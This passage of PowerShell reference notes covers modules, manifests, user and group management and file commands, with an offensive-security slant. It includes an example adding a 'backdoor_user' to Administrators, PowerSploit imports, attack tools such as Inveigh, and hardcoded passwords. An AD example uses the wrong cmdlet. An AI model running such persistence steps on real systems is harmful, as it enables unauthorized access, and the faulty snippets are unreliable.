| `-WhatIf`, `-wi`  | Show what would happen without executing the command.                              |
- Ask for confirmation before running:

```powershell
Stop-Service Spooler -Confirm
```

- Simulate the command without executing it:

```powershell
Stop-Service Spooler -WhatIf
```
#### Transaction parameters

| Parameter                   | Description                                                                                                 |
| --------------------------- | ----------------------------------------------------------------------------------------------------------- |
| `-UseTransaction`, `-usetx` | Include the command in an active PowerShell transaction. Only works with cmdlets that support transactions. |

- Execute within a transaction:

```powershell
Start-Transaction
Set-Item HKCU:\Test\Value 42 -UseTransaction
Complete-Transaction
```

>[!interesting]+ Transactions
>A **transaction** is a temporary, reversible "session" in which multiple operations are grouped together. If _all_ operations succeed → the transaction is **committed**. If _any_ operation fails → the transaction can be **rolled back**. Like "Atomicity" in databases' [ACID](https://en.wikipedia.org/wiki/ACID).
>- See [`about_Transactions — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_transactions?view=powershell-5.1).
## PowerShell modules

>A **PowerShell module** is a self-contained, distributable unit of PowerShell code that packages related functions, cmdlets, variables, aliases, and other resources built around a common purpose.

- Modules are how PowerShell functionality is organized and distributed beyond what ships with the base runtime.

>[!note] See [`Understanding a Windows PowerShell Module — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.6&viewFallbackFrom=powershell-7.2).

### Module search paths

When you type a command PowerShell doesn't recognize, it tries to find and load the appropriate module:
1. Resolve command name against commands already in the session.
2. If not found, **attempt to auto-load**: search directories listed in `$env:PSModulePath` for a module that *exports* a command with that name.
3. If a candidate module is found, PowerShell **imports** it into the current runspace using `Import-Module`.
4. The imported module's manifest and module file are evaluated, exported commands are registered, and the originally requested command is executed.
5. If multiple modules could satisfy the command, PowerShell uses the module discovery order and version rules to pick one.

>[!important]+ Module auto-importing
>When you first call a command from a module, **PowerShell imports that module automatically** if the module path is listed in `$env:PSModulePath` — you won't usually need to use `Import-Module` cmdlet. This behavior is controlled by `$PSModuleAutoLoadingPreference`.

>**`$env:PSModulePath`** is an environment that contains a semicolon-separated list of directories PowerShell searches recursively for modules. 

The effective set of locations depends on PowerShell edition and scope.
- See all module search directories:

```powershell
$env:PSModulePath
```

- Format as a list:

```powershell
$env:PSModulePath -split ';'
```

>[!example]+
> 
> ```powershell
> $env:PSModulePath -split ';'
> ```
> 
> ```powershell
> C:\Users\Username\Documents\WindowsPowerShell\Modules
> C:\Program Files\WindowsPowerShell\Modules
> C:\Windows\system32\WindowsPowerShell\v1.0\Modules
> ```

| **Scope**        | **Typical default path**                             |
| ---------------- | ---------------------------------------------------- |
| **Current user** | `%UserProfile%\Documents\PowerShell\Modules`         |
| **All users**    | `C:\Program Files\PowerShell\Modules`                |
| **System**       | `C:\Windows\System32\WindowsPowerShell\v1.0\Modules` |

- PowerShell searches these directories recursively for subdirectories containing `.psd1` (manifest), `.psm1` (script module), or `.dll` (binary module) files. If a module folder name matches an exported command name, auto-loading kicks in.
- Auto-loading behavior is controlled by `$PSModuleAutoLoadingPreference`. The default value is `All`,, which means auto-loading is enabled; `None` disables it.

>[!note] See [`about_PSModulePath — Mirosoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath?view=powershell-7.5).
### Structure of a PowerShell module

There are two main module types:
- **Script modules (`.psm1`)** — Valid PowerShell script (same as `.ps1`) that defines and exports functions, variables, and classes.
- **Binary modules (`.dll`)** — A compiled .NET assembly (`.dll`) that exposes cmdlets, providers, and classes (implemented via `Cmdlet` or `PSProvider` base classes). PowerShell itself is largely built from binary modules.

>**Module manifest (`.psd1`)** is a data file (PowerShell hash table) that describes the module: version, GUID, exported functions, dependencies, and metadata. The file itself is not executable, but it controls what gets loaded and exposed.

Typical module directory structure:

```powershell
ModuleName
|___ModuleName.psd1
|___ModuleName.psm1
|___Private
|   |___ps1
|       |___Verb-Noun.ps1
|       |___Verb-Noun.ps1
|
|___Public
    |___ps1
        |___Verb-Noun.ps1
        |___Verb-Noun.ps1
```

- `ModuleName` — Name of the module.
- `ModuleName.psd1` — Module manifest.
- `ModuleName.psm1` — Script module.
- `Private` — A directory that stores private functions and variables (such as helper functions).
	- `ps1` — A subdirectory that stores PowerShell functions that are not directly referenced by the user.
		- `Verb-Noun.ps1` — A script file that contains private PowerShell functions.
- `Public` — A directory that stores public functions and variables.
	- `ps1` — A subdirectory that stores PowerShell functions and cmdlets the user will be running.
		- `Verb-Noun.ps1` — A script file that contains private PowerShell functions.

>[!example]- Example of a module manifest
> ```powershell
> #
> # Module manifest for module 'example-module'
> #
> # Generated by: Username
> #
> # Generated on: 03/15/2026
> #
> 
> @{
> 
> # Script module or binary module file associated with this manifest.
> # RootModule = ''
> 
> # Version number of this module.
> ModuleVersion = '1.0'
> 
> # Supported PSEditions
> # CompatiblePSEditions = @()
> 
> # ID used to uniquely identify this module
> GUID = '59a544f1-604d-461c-9730-0b7e33b18e63'
> 
> # Author of this module
> Author = 'Username'
> 
> # Company or vendor of this module
> CompanyName = 'Unknown'
> 
> # Copyright statement for this module
> Copyright = '(c) 2026 Username. All rights reserved.'
> 
> # Description of the functionality provided by this module
> # Description = ''
> 
> # Minimum version of the Windows PowerShell engine required by this module
> # PowerShellVersion = ''
> 
> # Name of the Windows PowerShell host required by this module
> # PowerShellHostName = ''
> 
> # Minimum version of the Windows PowerShell host required by this module
> # PowerShellHostVersion = ''
> 
> # Minimum version of Microsoft .NET Framework required by this module. This prerequisite is valid for the PowerShell Desktop edition only.
> # DotNetFrameworkVersion = ''
> 
> # Minimum version of the common language runtime (CLR) required by this module. This prerequisite is valid for the PowerShell Desktop edition only.
> # CLRVersion = ''
> 
> # Processor architecture (None, X86, Amd64) required by this module
> # ProcessorArchitecture = ''
> 
> # Modules that must be imported into the global environment prior to importing this module
> # RequiredModules = @()
> 
> # Assemblies that must be loaded prior to importing this module
> # RequiredAssemblies = @()
> 
> # Script files (.ps1) that are run in the caller's environment prior to importing this module.
> # ScriptsToProcess = @()
> 
> # Type files (.ps1xml) to be loaded when importing this module
> # TypesToProcess = @()
> 
> # Format files (.ps1xml) to be loaded when importing this module
> # FormatsToProcess = @()
> 
> # Modules to import as nested modules of the module specified in RootModule/ModuleToProcess
> # NestedModules = @()
> 
> # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.
> FunctionsToExport = @()
> 
> # Cmdlets to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no cmdlets to export.
> CmdletsToExport = @()
> 
> # Variables to export from this module
> VariablesToExport = '*'
> 
> # Aliases to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no aliases to export.
> AliasesToExport = @()
> 
> # DSC resources to export from this module
> # DscResourcesToExport = @()
> 
> # List of all modules packaged with this module
> # ModuleList = @()
> 
> # List of all files packaged with this module
> # FileList = @()
> 
> # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.
> PrivateData = @{
> 
>     PSData = @{
> 
>         # Tags applied to this module. These help with module discovery in online galleries.
>         # Tags = @()
> 
>         # A URL to the license for this module.
>         # LicenseUri = ''
> 
>         # A URL to the main website for this project.
>         # ProjectUri = ''
> 
>         # A URL to an icon representing this module.
>         # IconUri = ''
> 
>         # ReleaseNotes of this module
>         # ReleaseNotes = ''
> 
>     } # End of PSData hashtable
> 
> } # End of PrivateData hashtable
> 
> # HelpInfo URI of this module
> # HelpInfoURI = ''
> 
> # Default prefix for commands exported from this module. Override the default prefix using Import-Module -Prefix.
> # DefaultCommandPrefix = ''
> 
> }
> ```

>[!interesting]- Notable module manifest variables
> | Variable               | Description                                                                                                          |
> | ---------------------- | -------------------------------------------------------------------------------------------------------------------- |
> | `RootModule`           | Primary execution entry point (`.psm1`/`.dll`). Defines what code is actually loaded when `Import-Module` is called. |
> | `ModuleVersion`        | Semantic version used for dependency resolution, upgrades, and side-by-side loading control.                         |
> | `GUID`                 | Globally unique identifier for module identity; used internally to distinguish modules beyond name collisions.       |
> | `PowerShellVersion`    | Minimum engine version required; enforces runtime compatibility before module load.                                  |
> | `RequiredModules`      | Hard dependencies that must be loaded first; creates implicit import chain (attack surface expansion).               |
> | `RequiredAssemblies`   | Preloads external DLLs before module execution; common vector for unmanaged code execution.                          |
> | `ScriptsToProcess`     | Executes scripts in caller's scope _before_ module import.                                                           |
> | `TypesToProcess`       | Loads type extensions (`.ps1xml`); modifies object behavior globally (formatting/type confusion opportunities).      |
> | `FormatsToProcess`     | Defines output formatting rules; affects how objects are displayed (useful for deception/obfuscation).               |
> | `NestedModules`        | Loads additional modules into current module scope; used for modular design or stealth chaining.                     |
> | `FunctionsToExport`    | Explicit allowlist of exposed functions; controls public API vs internal logic.                                      |
> | `CmdletsToExport`      | Defines which compiled cmdlets are exposed; limits surface of binary modules.                                        |
> | `VariablesToExport`    | Controls which variables leak into caller scope; wildcard (`*`) = full exposure.                                     |
> | `AliasesToExport`      | Exports command aliases; can be abused for command masquerading.                                                     |
> | `DefaultCommandPrefix` | Prepends prefix to exported commands; helps avoid collisions or enables stealth renaming.                            |

>[!note] See [`about_Module_Manifests — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_module_manifests?view=powershell-7.6&ref=benheater.com).

>[!note]+ Dynamic modules
> There are also **dynamic modules**.
>>A **dynamic module** is a module that is not loaded from, or saved to, a file. Instead, they are created dynamically by a script, using the [`New-Module`](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/New-Module) cmdlet.


### Module management

#### Listing and inspecting modules

| Cmdlet                                                                                                                      | Description                                                             |
| --------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| [`Get-Module`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/get-module)                          | List modules loaded in the current session.                             |
| `Get-Module -ListAvailable`                                                                                                 | List all modules available (installed) on the system (not only loaded). |
| `Get-Module <Name> -FullyQualifiedName`                                                                                     | Display detailed module metadata (version, path, GUID, etc.).           |
| [`Get-Command`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/get-command) `-Module <ModuleName>` | List commands exported by a specific module.                            |
| [`Get-Help`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/get-help) `<Cmdlet>`                   | Get documentation for a cmdlet or function.                             |



- List modules currently loaded in the session:

```powershell
Get-Module
```

>[!example]-
> ```powershell
>  Get-Module | ft -AutoSize -Wrap
> ```
> 
> ```powershell
> 
> ModuleType Version Name                            ExportedCommands
> ---------- ------- ----                            ----------------
> Manifest   6.1.0.0 Microsoft.PowerShell.Management {Add-Content,
>                                                    Clear-Content, Clear-Item,
>                                                    Clear-ItemProperty…}
> Manifest   6.1.0.0 Microsoft.PowerShell.Utility    {Add-Member, Add-Type,
>                                                    Clear-Variable,
>                                                    Compare-Object…}
> ```

- List all modules installed on the system (not just loaded):

```powershell
Get-Module -ListAvailable
```

>[!example]-
> ```powershell
> Get-Module -ListAvailable
> ```
> 
> ```powershell
> ModuleType Version    PreRelease Name                                PSEdition
> ---------- -------    ---------- ----                                ---------
> Manifest   1.2.5                 Microsoft.PowerShell.Archive        Desk     
> Manifest   7.0.0.0               Microsoft.PowerShell.Host           Core     
> Manifest   7.0.0.0               Microsoft.PowerShell.Management     Core     
> Manifest   7.0.0.0               Microsoft.PowerShell.Security       Core     
> Manifest   7.0.0.0               Microsoft.PowerShell.Utility        Core     
> Script     1.4.7                 PackageManagement                   Desk     
> Script     2.2.5                 PowerShellGet                       Desk     
> Script     2.0.5                 PSDesiredStateConfiguration         Core     
> Script     2.1.0                 PSReadLine                          Desk     
> Binary     2.0.3                 ThreadJob                           Desk
> ```

- See commands exported by a specific module:

```powershell
Get-Command -Module ActiveDirectory
```

```powershell
Get-Command -Module PowerSploit
```

- Inspect module metadata:

```powershell
Get-Module ActiveDirectory | Select-Object Name, Version, Path, ExportedCommands
```

#### Loading and managing modules

| Cmdlet                                                                                                               | Description                                                               |
| -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| [`Find‑Command`](https://learn.microsoft.com/powershell/module/powershellget/find-command)                           | Search for commands across repositories.                                  |
| [`Find‑DscResource`](https://learn.microsoft.com/powershell/module/powershellget/find-dscresource)                   | Find DSC resources in repositories.                                       |
| [`Find‑Module`](https://learn.microsoft.com/powershell/module/powershellget/find-module)                             | Search modules available in the registered repositories (like PSGallery). |
| [`Find‑RoleCapability`](https://learn.microsoft.com/powershell/module/powershellget/find-rolecapability)             | Find role capability packages.                                            |
| [`Find‑Script`](https://learn.microsoft.com/powershell/module/powershellget/find-script)                             | Search for scripts in registered repositories.                            |
| [`Get‑PSRepository`](https://learn.microsoft.com/powershell/module/powershellget/get-psrepository)                   | List registered repositories like PSGallery.                              |
| [`Import-Module`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/import-module)             | Load module into current session.                                         |
| [`Install-Module`](https://learn.microsoft.com/powershell/module/powershellget/install-module)                       | Install module from PSGallery or configured repositories.                 |
| [`Install‑Script`](https://learn.microsoft.com/powershell/module/powershellget/install-script)                       | Install a script from a gallery repository.                               |
| [`New-ModuleManifest`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/new-modulemanifest)   | Create a new module manifest (`.psd1` file).                              |
| [`Publish‑Module`](https://learn.microsoft.com/powershell/module/powershellget/publish-module)                       | Upload a module to a repository you control.                              |
| [`Register‑PSRepository`](https://learn.microsoft.com/powershell/module/powershellget/register-psrepository)         | Register a new module repository (e.g., PSGallery).                       |
| [`Remove-Module`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/remove-module)             | Unload a module from the current session.                                 |
| [`Save-Module`](https://learn.microsoft.com/powershell/module/powershellget/save-module)                             | Download module without installing it (useful for offline analysis).      |
| [`Set‑PSRepository`](https://learn.microsoft.com/powershell/module/powershellget/set-psrepository)                   | Modify repository properties (e.g., trust level).                         |
| [`Test-ModuleManifest`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/test-modulemanifest) | Validate the integrity and structure of a module manifest.                |
| [`Uninstall-Module`](https://learn.microsoft.com/powershell/module/powershellget/uninstall-module)                   | Remove a module from the system.                                          |
| [`Unregister‑PSRepository`](https://learn.microsoft.com/powershell/module/powershellget/unregister-psrepository)     | Unregister a module repository.                                           |
| [`Update-Module`](https://learn.microsoft.com/powershell/module/powershellget/update-module)                         | Update an installed module to the latest version.                         |

- Manually import a module:

```powershell
Import-Module ActiveDirectory
```

- Force-reload a module (useful during development or after updates):

```powershell
Import-Module .\MyModule.psm1 -Force
```

- Load a module from a specific path:

```powershell
Import-Module C:\Tools\PowerSploit\PowerSploit.psd1
```

- Unload a module from the current session:

```powershell
Remove-Module ActiveDirectory
```

- Install from PowerShell Gallery (requires Internet access):

```powershell
Install-Module -Name PowerShellGet -Scope CurrentUser
```

- Install a module for all users on the system (requires privileges):

```powershell
Install-Module -Name PowerShellGet -Scope AllUsers
```

- Save module locally without installing it (useful for offline inspection):

```powershell
Save-Module -Name ActiveDirectory -Path C:\Modules
```

- Update an installed module:

```powershell
Update-Module -Name PowerShellGet
```

- Uninstall a module:

```powershell
Uninstall-Module -Name SomeModule
```


- Generate a new module manifest:

```powershell
New-ModuleManifest -Path .\MyModule.psd1 -Author "YourName" -ModuleVersion "1.0"
```

- Validate an existing manifest:

```powershell
Test-ModuleManifest -Path .\MyModule.psd1
```
### PowerShell Gallery

>[PSGallery](https://www.powershellgallery.com/) (PowerShell Gallery) is the central repository for PowerShell content, including scripts, modules, and Desired State Configuration (DSC) resources.

- The Gallery contains both packages authored by **Microsoft** and the **PowerShell community**.
- To work with PowerShell Gallery, you can use cmdlets from the `PowerShellGet` module.

Notable tools:
- [`AdminToolbox`](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8)
	- A collection of helpful modules for administrative tasks, like dealing with Active Directory and network management.
- [`ActiveDirectory`](https://learn.microsoft.com/en-us/powershell/module/activedirectory)
	- A collection administration tools for working with Active Directory.
- [`Empire / Situational Awareness`](https://github.com/BC-SECURITY/Empire/tree/master/empire/server/data/module_source/situational_awareness)
	- A collection of PowerShell modules and scripts for basic information gathering about the host and network; maintained by [BC Security](https://github.com/BC-SECURITY) as a part of the Empire Framework.
- [`Inveigh`](https://github.com/Kevin-Robertson/Inveigh)
	- Tools for performing network spoofing and Man-in-the-middle attacks.
- [`BloodHound / SharpHound`](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
	- Tools for visualizing Active Directory environment.

## User and group management

### Local users 


Cmdlets from the `Microsoft.PowerShell.LocalAccounts` module are used to manage accounts on the local machine — no domain involved. This module ships by default with all modern Windows versions.

| Cmdlet                                                                                                                          | Description                                                                |
| ------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| [`Get-LocalUser`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser)         | Enumerate local user accounts and their properties.                        |
| [`New-LocalUser`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/new-localuser)         | Create a new local user account.                                           |
| [`Set-LocalUser`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/set-localuser)         | Modify properties of an existing local user (password, description, etc.). |
| [`Enable-LocalUser`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/enable-localuser)   | Enable a disabled local user account.                                      |
| [`Disable-LocalUser`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/disable-localuser) | Disable a local user account without deleting it.                          |
| [`Remove-LocalUser`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/remove-localuser)   | Permanently delete a local user account.                                   |

- List all local users:

```powershell
Get-LocalUser
```

>[!example]-
> ```powershell
> Get-LocalUser | ft
> ```
> 
> ```powershell
> Name               Enabled Description
> ----               ------- -----------
> Administrator      True    Built-in account for administering the computer/domain
> DefaultAccount     False   A user account managed by the system.
> Guest              False   Built-in account for guest access to the computer/domain
> Username           True
> WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scenarios.
> ```

- List all local users with useful information about them:

```powershell
Get-LocalUser | Format-Table Name, Enabled, LastLogon, PasswordRequired
```

>[!tip]+
> Quick survey of all local accounts — status, password policy, last logon:
> 
> ```powershell 
> Get-LocalUser | Select-Object Name, Enabled, PasswordRequired, PasswordLastSet, LastLogon, Description | Format-Table -AutoSize
> ```

- Get a specific user:

```powershell
Get-LocalUser -Name "Administrator"
```

- List all enabled local user:

```powershell
Get-LocalUser | Where-Object { $_.Enabled -eq $true }
```

- Create a new local user (prompts for password):

```powershell
New-LocalUser -Name "svc_backup" -Password (Read-Host -AsSecureString) -Description "Backup service account"
```

- Create a user with no password expiry:

```powershell
New-LocalUser -Name "svc_scan" -Password (ConvertTo-SecureString "passwd123" -AsPlainText -Force) -PasswordNeverExpires
```

- Change a user's password:

```powershell
$newPass = ConvertTo-SecureString "newpasswd123" -AsPlainText -Force
Set-LocalUser -Name "Username" -Password $newPass
```

- Disable/enable accounts:

```powershell
Disable-LocalUser -Name "Username"
```

```powershell
Enable-LocalUser -Name "Username"
```

### Local groups

| Cmdlet                                                                                                                                      | Description                           |
| ------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------- |
| [`Get-LocalGroup`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localgroup)                   | List all local security groups.       |
| [`Get-LocalGroupMember`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localgroupmember)       | Enumerate members of a local group.   |
| [`New-LocalGroup`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/new-localgroup)                   | Create a new local group.             |
| [`Add-LocalGroupMember`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/add-localgroupmember)       | Add a user or group to a local group. |
| [`Remove-LocalGroupMember`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/remove-localgroupmember) | Remove a member from a local group.   |

- List all local groups:

```powershell
Get-LocalGroup
```

- List group members:

```powershell
Get-LocalGroupMember -Group "Administrators"
```

- Create a new local group:

```powershell
New-LocalGroup -Name "AppUsers" -Description "Application service accounts"
```

- Add a user to a group:

```powershell
Add-LocalGroupMember -Group "Administrators" -Member "backdoor_user"
```

- Remove a user from a group:

```powershell
Remove-LocalGroupMember -Group "Administrators" -Member "Username"
```
### AD users

Cmdlets for managing AD users are exported by the `ActiveDirectory` module, available on domain controllers by default and installable on workstations via RSAT (Remote Server Administration Tools). 

| Cmdlet                                                                                                               | Description                                                              |
| -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| [`Get-ADUser`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser)                       | Query AD user objects with rich filtering.                               |
| [`New-ADUser`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/new-aduser)                       | Create a new AD user object.                                             |
| [`Set-ADUser`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-aduser)                       | Modify attributes of an existing AD user.                                |
| [`Set-ADAccountPassword`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword) | Reset or change an AD account's password.                                |
| [`Enable-ADAccount`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/enable-adaccount)           | Enable a disabled AD account.                                            |
| [`Disable-ADAccount`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/disable-adaccount)         | Disable an AD account without deleting it.                               |
| [`Search-ADAccount`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/search-adaccount)           | Find accounts meeting specific criteria (locked out, expired, inactive). |
| [`Remove-ADUser`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/remove-aduser)                 | Delete an AD user object.                                                |

- List all AD users:

```powershell
Get-ADUser -Filter *
```

- Display enabled users with useful information:

```powershell
Get-ADUser -Filter {Enabled -eq $true} `
    -Properties DisplayName, EmailAddress, LastLogonDate, PasswordLastSet, PasswordNeverExpires |
Select-Object SamAccountName, DisplayName, EmailAddress, LastLogonDate, PasswordLastSet, PasswordNeverExpires
```

- Get specific user with all properties:

```powershell
Get-ADUser -Identity Username -Properties *
```

- Find all disabled accounts:

```powershell
Get-ADUser -Filter 'Enabled -eq $false' | Select-Object Name, SamAccountName
```

- Find accounts with passwords that never expire:

- Find accounts that haven't logged in for 90+ days:

```powershell
$cutoff = (Get-Date).AddDays(-90)
Get-ADUser -Filter { LastLogonDate -lt $cutoff } -Properties LastLogonDate |
    Select-Object Name, SamAccountName, LastLogonDat
```

 - Find locked-out accounts:

```powershell
Search-ADAccount -LockedOut | Select-Object Name, SamAccountName
```

- Create a new AD user:

```powershell
New-ADUser -Name "John Doe" -SamAccountName "Username" -AccountPassword (Read-Host -AsSecureString) -Enabled $true
```

- Disable/enable accounts (`-Name` for local users, `-Identity` for AD users):

```powershell
Disable-LocalUser -Identity "Username"
```

```powershell
Enable-LocalUser -Identity "Username"
```

- Reset password:

```powershell
Set-ADAccountPassword -Identity "Username" -Reset -NewPassword (ConvertTo-SecureString "newpasswd123" -AsPlainText -Force)
```

- Force password change at next logon:

```powershell
Set-ADUser -Identity "Username" -ChangePasswordAtLogon $true
```


### AD groups


| Cmdlet                                                                                                                                 | Description                                    |
| -------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| [`Get-ADGroup`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup)                                       | Query AD group objects.                        |
| [`Get-ADGroupMember`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember)                           | List members of an AD group.                   |
| [`Get-ADPrincipalGroupMembership`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adprincipalgroupmembership) | List all groups a user or computer belongs to. |
| [`New-ADGroup`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/new-adgroup)                                       | Create a new AD group.                         |
| [`Add-ADGroupMember`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/add-adgroupmember)                           | Add objects to an AD group.                    |
| [`Remove-ADGroupMember`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/remove-adgroupmember)                     | Remove objects from an AD group.               |

- List all groups:

```powershell
Get-ADGroup -Filter *
```

- List group members:

```powershell
Get-ADGroupMember -Identity "Domain Admins"
```

- Recursively expand nested group membership:

```powershell
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object Name, SamAccountName
```

- List all groups a user belongs to (direct membership):

```powershell
Get-ADPrincipalGroupMembership -Identity "Username" | Select-Object Name, GroupCategory
```

- Create a new security group:

```powershell
New-ADGroup -Name "DevOps" -GroupScope Global -GroupCategory Security -Path "OU=Groups,DC=corp,DC=local"
```

- Add a user to a group:

```powershell
Add-ADGroupMember -Identity "DevOps" -Members "Username"
```
## Working with system

### Navigation

| Cmdlet                                                                                                         | Description                                            | Alias               |
| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ | ------------------- |
| [`Get-Location`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-location)   | Show current working directory.                        | `pwd`               |
| [`Set-Location`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/set-location)   | Change current directory.                              | `cd`, `chdir`, `sl` |
| [`Push-Location`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/push-location) | Save current location to stack, then change directory. | `pushd`             |
| [`Pop-Location`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/pop-location)   | Return to last saved location from stack.              | `popd`              |
| [`Resolve-Path`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/resolve-path)   | Resolve relative path to absolute path.                |                     |
| [`Test-Path`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/test-path)         | Test whether a path exists. Returns `$true`/`$false`.  |                     |

- Navigate around:

```powershell
Set-Location C:\Users\Administrator
```

```powershell
cd C:\Windows\System32
```

- Save current location, go elsewhere, then return:

```powershell
Push-Location C:\Temp
# do work...
Pop-Location       # returns to wherever you pushed from
```

- Resolve a relative path to absolute:

```powershell
Resolve-Path .\logs\app.log
```
### Listing and searching

| Cmdlet                                                                                                         | Description                                                                   | Alias              |
| -------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- | ------------------ |
| [`Get-ChildItem`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-childitem) | List files and directories at a path.                                         | `ls`, `dir`, `gci` |
| [`Get-Item`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-item)           | Get a specific item (file, directory, registry key, etc.).                    | `gi`               |
| [`Get-PSDrive`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-psdrive)     | List available PowerShell drives (including `HKLM:`, `HKCU:`, `Cert:`, etc.). | `gdr`              |

### Get-ChildItem

- Basic listing:

```powershell
Get-ChildItem C:\Users\Administrator
```

- List items recursively:

```powershell
Get-ChildItem C:\ -Recurse
```


- Include hidden and system files:

```powershell
Get-ChildItem -Force
```


- List only directories:

```powershell
Get-ChildItem -Directory
```

- List only files:

```powershell
Get-ChildItem -File
```

- Filter by name/extension:

```powershell
Get-ChildItem *.txt
```

```powershell
Get-ChildItem -Filter "*.log"
```

```powershell
Get-ChildItem -Include "*.txt","*.cfg" -Recurse
```

- Find all files with a specific extension, recursively, suppressing access errors:

```powershell
Get-ChildItem -Path "C:\" -Filter "*.evtx" -Recurse -File -ErrorAction SilentlyContinue
```

- Get full paths of all files recursively:

```powershell
Get-ChildItem C:\ -Recurse -File -Force -ErrorAction SilentlyContinue |
    Select-Object FullName, Length, LastWriteTime
```

- Find files modified in the last 24 hours:

```powershell
$cutoff = (Get-Date).AddHours(-24)
Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt $cutoff }
```

- Key `Get-ChildItem` parameters:

| Parameter             | Description                                              |
| --------------------- | -------------------------------------------------------- |
| `-Path <path>`        | Specify the location to enumerate.                       |
| `-Filter <pattern>`   | Provider-level filter (efficient, wildcards only).       |
| `-Include <patterns>` | Include items matching patterns (works with `-Recurse`). |
| `-Exclude <patterns>` | Exclude items matching patterns.                         |
| `-Recurse`            | Search all subdirectories.                               |
| `-Depth <n>`          | Limit recursion depth.                                   |
| `-Force`              | Include hidden and system items.                         |
| `-File`               | Return only files.                                       |
| `-Directory`          | Return only directories.                                 |



### Reading file content

| Cmdlet                                                                                                     | Description            |                     |
| ---------------------------------------------------------------------------------------------------------- | ---------------------- | ------------------- |
| [`Get-Content`](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-content) | Display file contents. | `cat`, `gc`, `type` |

- Read file as array of lines (default behavior):

```powershell
$lines = Get-Content file.txt
$lines[0]         # first line
$lines[-1]        # last line
$lines.Count      # number of lines
```

- Read as a single string (preserves newlines):

```powershell
$content = Get-Content file.txt -Raw
```

- Read only the first `N` lines (like `head`):

```powershell
Get-Content file.txt -TotalCount 20
```

- Read only the last `N` lines (like `tail`):

```powershell
Get-Content file.txt -Tail 50
```

- Follow a file tail in real time (like `tail -f`):

```powershell
Get-Content C:\Logs\app.log -Tail 20 -Wait
```

- Read a binary file as bytes:

```powershell
[System.IO.File]::ReadAllBytes("file.bin")
```

- Read with specific encoding:

```powershell
Get-Content file.txt -Encoding UTF8
```

```powershell
Get-Content file.txt -Encoding Unicode
```

- Key `Get-Content` options:

| Parameter          | Description                                               |
| ------------------ | --------------------------------------------------------- |
| `-Path`            | File path(s) to read.                                     |
| `-Raw`             | Read entire file as a single string.                      |
| `-TotalCount <n>`  | Read first N lines.                                       |
| `-Tail <n>`        | Read last N lines.                                        |
| `-Wait`            | Keep reading as new content is appended (like `tail -f`). |
| `-Encoding <type>` | Specify encoding: UTF8, Unicode, ASCII, Default, etc.     |
